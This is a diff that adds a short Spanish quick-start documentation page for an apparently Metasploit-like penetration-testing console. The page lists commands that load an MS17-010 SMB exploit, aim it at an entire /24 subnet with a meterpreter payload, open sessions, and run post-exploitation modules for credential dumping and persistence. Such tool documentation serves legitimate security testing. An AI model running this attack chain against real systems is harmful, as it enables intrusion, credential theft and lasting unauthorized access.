@@ -1,0 +1,24 @@
+---
+title: "Uso rápido"
+description: Comandos básicos para empezar a usar la consola.
+---
+
+```bash
+# Iniciar consola
+python console/main.py
+
+# Dentro de la consola:
+msf > search smb
+msf > use exploits/windows/smb/ms17_010
+msf > set RHOSTS 192.168.1.0/24
+msf > set PAYLOAD payloads/windows/x64/meterpreter.exe
+msf > run
+
+# Ver sesiones
+msf > sessions -l
+msf > sessions -i 1
+
+# Post-explotación
+meterpreter > run post/windows/cred_dump
+meterpreter > run post/windows/persistence
+```
